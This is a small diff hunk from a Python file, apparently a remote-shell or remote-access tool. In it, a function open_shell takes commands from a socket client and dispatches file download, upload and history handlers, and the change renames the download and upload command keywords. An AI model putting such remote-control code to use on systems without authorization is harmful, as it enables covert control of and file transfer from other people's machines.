@@ -36,9 +36,9 @@ def open_shell(_client):
             command = _client.recv(4096).decode()
             if command == '':
                 break
-            elif command == 'dl\n':
+            elif command == '_DOWNLOAD_\n':
                 download(_client)
-            elif command == 'u\n':
+            elif command == '_UPLOAD_\n':
                 upload(_client)
             elif command == '_HISTORY_\n':
                 hist = ''
